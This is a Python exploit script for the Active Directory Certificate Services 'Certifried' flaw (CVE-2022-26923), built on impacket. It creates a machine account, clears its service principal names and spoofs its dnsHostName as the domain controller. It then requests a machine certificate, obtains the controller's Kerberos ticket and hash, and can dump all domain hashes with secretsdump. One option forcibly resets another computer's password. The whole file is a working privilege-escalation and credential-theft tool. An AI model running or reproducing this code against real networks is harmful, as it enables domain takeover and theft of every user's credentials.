#!/usr/bin/env python3
from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_credentials

from utils.addcomputer import AddComputerSAMR
from utils.secretsdump import DumpSecrets
from utils.helpers import *
from utils.certi import main_req
from utils.gettgtpkinit import amain
from utils.getnthash import GETPAC

import argparse
import sys
import ldap3
import logging
import random
import string

class Exploit:
    def __init__(self, username, password, domain, cmdLineOptions):
        self.options = cmdLineOptions
        self.__username = username
        self.__password = password
        self.__domain = domain
        
        if self.options.no_add and not self.options.computer_name:
            logging.error(f'Net input a target with `-computer-name` !')
            return

        if self.options.ca and not self.options.ca_host:
            logging.error(f'Specify -ca-host to use with -ca flag')
            return
        
        if self.options.computer_name:
            new_computer_name = self.options.computer_name
        else:
            new_computer_name = 'WIN-'+''.join(random.sample(string.ascii_letters + string.digits, 11)).upper()

        if new_computer_name[-1] != '$':
            new_computer_name += '$'

        if self.options.no_add:
            if self.options.old_hash:
                if ":" not in self.options.old_hash:
                    logging.error("Hash format error.")
                    return
                self.options.old_pass = self.options.old_hash

            if self.options.old_pass:
                new_computer_password = self.options.old_pass
            else:
                # if change the computer password, trust relationship between target computer and the primary domain may failed !
                logging.error("Net input the password with `-old-pass` or `-old-hash` !")
                return
        else:
            self.options.old_pass = self.options.old_hash = ""
            if self.options.computer_pass:
                new_computer_password = self.options.computer_pass
            else:
                new_computer_password = ''.join(random.choice(list(string.ascii_letters + string.digits + "!@#$%^&*()")) for _ in range(12))

        domain, username, password, lmhash, nthash = parse_identity(self.options)
        ldap_server, ldap_session = init_ldap_session(self.options, domain, username, password, lmhash, nthash)

        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
        check_domain = ".".join(domain_dumper.getRoot().replace("DC=","").split(","))
        if domain != check_domain:
            logging.error("Pls use full domain name, such as: domain.com/username")
            return
        MachineAccountQuota = 10
        # check MAQ and options
        for i in domain_dumper.getDomainPolicy():
            MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))

        if MachineAccountQuota < 1 and not self.options.no_add and not self.options.create_child:
            logging.error(f'Cannot exploit , ms-DS-MachineAccountQuota {MachineAccountQuota}')
            return
        else:
            logging.info(f'Current ms-DS-MachineAccountQuota = {MachineAccountQuota}')

        dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
        if dn and self.options.no_add:
            logging.info(f'{new_computer_name} already exists! Using no-add mode.')
            if not self.options.old_pass:
                if self.options.use_ldap:
                    logging.error(f'Modify password need ldaps !')
                    return
                ldap_session.extend.microsoft.modify_password(str(dn['dn']), new_computer_password)
                if ldap_session.result['result'] == 0:
                    logging.info(f'Modify password successfully, host: {new_computer_name} password: {new_computer_password}')
                else:
                    logging.error('Cannot change the machine password , exit.')
                    return
        elif self.options.no_add and not dn:
            logging.error(f'Target {new_computer_name} not exists!')
            return
        elif dn:
            logging.error(f'Account {new_computer_name} already exists!')
            return

        if self.options.dc_host:
            dc_host = self.options.dc_host.upper()
            dcfull = f'{dc_host}.{domain}'
            dn = get_user_info(dc_host+"$", ldap_session, domain_dumper)
            if not dn:
                logging.error(f'Machine not found in LDAP: {dc_host}')
                return
        else:
            dcinfo = get_dc_host(ldap_session, domain_dumper,self.options)
            if len(dcinfo)== 0:
                logging.error("Cannot get domain info")
                exit()
            c_key = 0
            dcs = list(dcinfo.keys())
            if len(dcs) > 1:
                logging.info('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
                cnt = 0
                for name in dcs:
                    logging.info(f"{cnt}: {name}")
                    cnt += 1
                while True:
                    try:
                        c_key = int(input(">>> Your choice: "))
                        if c_key in range(len(dcs)):
                            break
                    except Exception:
                        pass
            dc_host = dcs[c_key].lower()
            dcfull = dcinfo[dcs[c_key]]['dNSHostName'].lower()
        logging.info(f'Selected Target {dcfull}')

        if not self.options.no_add:
            logging.info(f'Adding Computer Account "{new_computer_name}"')
            logging.info(f'MachineAccount "{new_computer_name}" password = {new_computer_password}')

            # Creating Machine Account
            addmachineaccount = AddComputerSAMR(
                username, 
                password, 
                domain, 
                self.options,
                computer_name=new_computer_name,
                computer_pass=new_computer_password)
            addmachineaccount.run()

            new_machine_dn = None
            dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
            if dn:
                new_machine_dn = str(dn['dn'])
                logging.info(f'{new_computer_name} object = {new_machine_dn}')
            # clearSPN
            self.clear_spn(ldap_session,new_machine_dn,new_computer_name)

            # update dnsHostname attribute
            self.update_dnsHostName(ldap_session,new_machine_dn,dcfull,new_computer_name)

            # request certificate
            # find ca service
            enrollment_service = self.find_enrollment_services(ldap_session,domain_dumper.getRoot())

            if self.options.ca:
                ca_service = self.options.ca
                ca_host = self.options.ca_host
            else:
                ca_service = enrollment_service.get("cn")[0].decode()
                ca_host = enrollment_service.get("dNSHostName")[0].decode()
            
            print(ca_service,":",ca_host)

            # find template Machine
            if b'Machine' in enrollment_service.get("certificateTemplates"):
                logging.info(f"Certificate Machine found!")

            # print(f"certipy req 'lunar.eruca.com/{new_computer_name}:{new_computer_password}@{dcfull}' -dc-ip {self.options.dc_ip} -ca {ca_service[0].decode('utf-8')} -template {self.options.template}")
            
            # request certificate template for the newly created machine from the service
            # require service lunar-LUNDC-CA
            # require template machine
            # require username

            cert_pass = ''.join(random.choice(list(string.ascii_letters + string.digits + "!@#$%^&*()")) for _ in range(12))
            
            try:
                pfx_bytes = main_req(self.options,ca_host,ca_service,new_computer_name,new_computer_password,domain,lmhash,nthash,cert_pass)
                enc_key = amain(self.options,cert_pass,f'{new_computer_name}.pfx',domain,f'{dc_host}$')
                logging.info(f'Encryption key retrieved: {enc_key}')
            except:
                return
            
            os.environ['KRB5CCNAME'] = f'{dc_host}$.ccache'

            if self.options.dump:
                try:
                    self.options.k = True
                    self.options.target_ip = self.options.dc_ip
                    self.options.system = self.options.bootkey = self.options.security = self.options.system = self.options.ntds = self.options.sam = self.options.resumefile = self.options.outputfile = None
                    dumper = DumpSecrets(dcfull, '', '',domain, self.options)
                    dumper.dump()
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error(str(e))
            else:
                dumper = GETPAC(username,domain,enc_key,self.options)
                dumper.dump()



            # dcsync

    def find_enrollment_services(self,ldap_session,dn):
        enroll_filter = "(objectCategory=pKIEnrollmentService)"
        conf_base = "CN=Configuration,{}".format(dn)
        ldap_session.search(conf_base,enroll_filter,attributes=["cn","name","dNSHostname","cACertificateDN","cACertificate","certificateTemplates","objectGUID"])
        logging.info(f'Found {len(ldap_session.response)-1} CA Service(s)')
        return ldap_session.response[0]['raw_attributes']
        #for i in ldap_session.response[:-1]:
        #    print(i['raw_attributes'].get("cn"))


    def clear_spn(self,ldap_session,new_machine_dn,new_computer_name):
        if new_machine_dn:
            ldap_session.modify(new_machine_dn, {'servicePrincipalName':[ldap3.MODIFY_REPLACE, []]})
            if ldap_session.result['result'] == 0:
                logging.info(f'{new_computer_name} servicePrincipalName attribute cleared!')
            else:
                logging.error('Cannot clear servicePrincipalName , Reson {}'.format(ldap_session.result['message']))

    def update_dnsHostName(self,ldap_session,new_machine_dn,dcfull,new_computer_name):
        ldap_session.modify(new_machine_dn, {'dnsHostName':[ldap3.MODIFY_REPLACE, [dcfull]]})
        if ldap_session.result['result'] == 0:
            logging.info(f'{new_computer_name} dnsHostname attribute updated to {dcfull}') 
        else:
            logging.error('dnsHostname attribute failed to change , Reson {}'.format(ldap_session.result['message']))

def fetch_root_cas(ldap_conn, domain):
    cas_filter = "(objectClass=certificationAuthority)"
    cas_search_base = "CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,{}".format(get_base_dn(domain))
    resp = search_ldap(ldap_conn, cas_filter, cas_search_base)
    return get_certs_from_ldap_response(resp)

def main():
    parser = argparse.ArgumentParser(add_help = True, description = "ADCS Certifried (CVE-2022–26923)")
    parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-computer-name', action='store', metavar='NEWNAME', help='Target computer name, if not specified, will be random generated.')
    parser.add_argument('-computer-pass', action='store', metavar='PASSWORD', help='Add new computer password, if not specified, will be random generated.')
    parser.add_argument('-no-add', action='store_true', help='Forcibly change the password of the target computer.')
    parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
    parser.add_argument('-old-pass', action='store', metavar='PASSWORD', help='Target computer password, use if you know the password of the target you input with -target-name.')
    parser.add_argument('-old-hash', action='store', metavar='LMHASH:NTHASH', help='Target computer hashes, use if you know the hash of the target you input with -target-name.')
    parser.add_argument('-use-ldap', action='store_true', help='Use LDAP instead of LDAPS')
    parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')

    group = parser.add_argument_group('authentication')
    group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. '
                                                                      'Useful if you can\'t translate the FQDN.'
                                                                      'specified in the account parameter will be used')
    group.add_argument('-dc-host', action='store',metavar = "hostname",  help='Hostname of the domain controller to use. '
                                                                              'If ommited, the domain part (FQDN) '
                                                                              'specified in the account parameter will be used')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                        '(128 or 256 bits)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on account parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
   
    ca = parser.add_argument_group('certificate authority')
    ca.add_argument('-ca', action='store',metavar = "ca", help='CA Service Name')
    ca.add_argument('-ca-host', action='store',metavar = "ca host", help='CA dnsHostname property')
    ca.add_argument('-template', action='store',metavar = "template",default='Machine', help='Certificate Template Name')
    
    exec =  parser.add_argument_group('execute options')
    exec.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    dumper =  parser.add_argument_group('dump options')
    dumper.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                            'Implies also -just-dc switch')
    dumper.add_argument('-just-dc', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    dumper.add_argument('-just-dc-ntlm', action='store_true', default=False,
                       help='Extract only NTDS.DIT data (NTLM hashes only)')
    dumper.add_argument('-pwd-last-set', action='store_true', default=False,
                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    dumper.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
    dumper.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
    dumper.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                         'state')
    dumper.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method insead of default DRSUAPI')
    dumper.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                        'method to use at target (only when using -use-vss). Default: smbexec')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    domain, username, password = parse_credentials(options.account)

    try:
        if domain is None or domain == '':
            logging.critical('Domain should be specified!')
            sys.exit(1)

        if password == '' and username != '' and options.hashes is None and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        # Init the example's logger theme
        if options.debug is True:
            logging.getLogger().setLevel(logging.DEBUG)
            # Print the Library's installation path
            logging.debug(version.getInstallationPath())
        else:
            logging.getLogger().setLevel(logging.INFO)

        exploit = Exploit(username,password,domain,options)
    except ldap3.core.exceptions.LDAPBindError as e:
        logging.error(f"Pls check your account. Error: {e}")
    except ldap3.core.exceptions.LDAPSocketOpenError as e:
         logging.error(f"If ssl error, add `-use-ldap` parameter to connect with ldap. Error: {e}")
    except ldap3.core.exceptions.LDAPSocketSendError as e:
         logging.error(f"If ssl error, add `-use-ldap` parameter to connect with ldap. Error: {e}")
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
    
if __name__ == "__main__":
    main()
